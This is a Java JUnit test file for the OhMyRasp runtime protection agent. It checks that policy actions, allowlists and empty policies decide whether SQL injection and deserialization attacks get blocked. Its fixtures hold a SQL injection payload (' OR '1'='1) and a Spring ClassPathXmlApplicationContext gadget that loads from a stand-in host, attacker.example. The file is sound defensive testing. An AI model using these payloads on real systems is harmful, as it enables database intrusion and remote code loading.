package io.ohmyrasp.agent.hook;

import static org.junit.jupiter.api.Assertions.assertDoesNotThrow;
import static org.junit.jupiter.api.Assertions.assertThrows;

import io.ohmyrasp.agent.policy.AgentPolicy;
import java.util.Collections;
import java.util.Enumeration;
import java.util.List;
import java.util.Map;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.Test;

final class OhMyRaspHooksPolicyTest {
  @AfterEach
  void resetPolicy() {
    OhMyRaspHooks.installPolicy(AgentPolicy.absent(), "");
    OhMyRaspHooks.exitHttpRequest();
    System.clearProperty("ohmyrasp.block");
    System.clearProperty("ohmyrasp.force_block");
  }

  @Test
  void policyLogActionDoesNotBlockEvenWhenLegacyFlagIsEnabled() {
    System.setProperty("ohmyrasp.block", "true");
    OhMyRaspHooks.installPolicy(policy("log"), "agent-one");
    enterSqlRequest();

    assertDoesNotThrow(() -> OhMyRaspHooks.beforeSql(vulnerableSql()));
  }

  @Test
  void policyBlockActionThrowsBlockException() {
    OhMyRaspHooks.installPolicy(policy("block"), "agent-one");
    enterSqlRequest();

    assertThrows(OhMyRaspBlockException.class, () -> OhMyRaspHooks.beforeSql(vulnerableSql()));
  }

  @Test
  void applicationAllowlistSuppressesPolicyBlock() {
    OhMyRaspHooks.installPolicy(allowlistPolicy(), "agent-one");
    enterSqlRequest();

    assertDoesNotThrow(() -> OhMyRaspHooks.beforeSql(vulnerableSql()));
  }

  @Test
  void emptyPolicySuppressesStandaloneDetectorAction() {
    System.setProperty("ohmyrasp.block", "true");
    OhMyRaspHooks.installPolicy(AgentPolicy.empty(), "agent-one");
    enterSqlRequest();

    assertDoesNotThrow(() -> OhMyRaspHooks.beforeSql(vulnerableSql()));
  }

  @Test
  void protocolClassInstantiationPolicyBlockThrowsWithoutHttpRequest() {
    OhMyRaspHooks.installPolicy(protocolPolicy("block"), "agent-one");

    assertThrows(
        OhMyRaspBlockException.class,
        () ->
            OhMyRaspHooks.beforeProtocolClassInstantiation(
                "OpenWire",
                "org.springframework.context.support.ClassPathXmlApplicationContext",
                "http://attacker.example/poc.xml"));
  }

  private static AgentPolicy policy(String action) {
    return AgentPolicy.parse(
        """
        {
          "version": 4,
          "status": "active",
          "canary_percent": 100,
          "rules": [
            {
              "name": "SQL policy action",
              "hook": "sql",
              "algorithm": "sql_userinput",
              "action": "%s",
              "severity": "critical",
              "expression": "algorithm == \\"sql_userinput\\""
            }
          ]
        }
        """
            .formatted(action));
  }

  private static AgentPolicy allowlistPolicy() {
    return AgentPolicy.parse(
        """
        {
          "version": 4,
          "status": "active",
          "canary_percent": 100,
          "config": {
            "allowlist": {
              "enabled": true,
              "mode": "enforce",
              "entries": ["/login"]
            }
          },
          "rules": [
            {
              "name": "SQL policy action",
              "hook": "sql",
              "algorithm": "sql_userinput",
              "action": "block",
              "severity": "critical",
              "expression": "algorithm == \\"sql_userinput\\""
            }
          ]
        }
        """);
  }

  private static AgentPolicy protocolPolicy(String action) {
    return AgentPolicy.parse(
        """
        {
          "version": 4,
          "status": "active",
          "canary_percent": 100,
          "rules": [
            {
              "name": "Protocol class block",
              "hook": "deserialization",
              "algorithm": "deserialization_protocol_class",
              "action": "%s",
              "severity": "critical",
              "expression": "algorithm == \\"deserialization_protocol_class\\""
            }
          ]
        }
        """
            .formatted(action));
  }

  private static void enterSqlRequest() {
    OhMyRaspHooks.enterHttpRequest(new FakeRequest(), new FakeResponse());
  }

  private static String vulnerableSql() {
    return "select * from users where name = '' OR '1'='1'";
  }

  public static final class FakeRequest {
    public String getMethod() {
      return "GET";
    }

    public String getRequestURI() {
      return "/login";
    }

    public String getQueryString() {
      return "value=' OR '1'='1";
    }

    public Map<String, List<String>> getParameterMap() {
      return Map.of("value", List.of("' OR '1'='1"));
    }

    public Enumeration<String> getHeaderNames() {
      return Collections.enumeration(List.of("user-agent"));
    }

    public String getHeader(String name) {
      return "JUnit";
    }
  }

  public static final class FakeResponse {
    private String location;

    public void sendRedirect(String location) {
      this.location = location;
    }

    public String location() {
      return location;
    }
  }
}
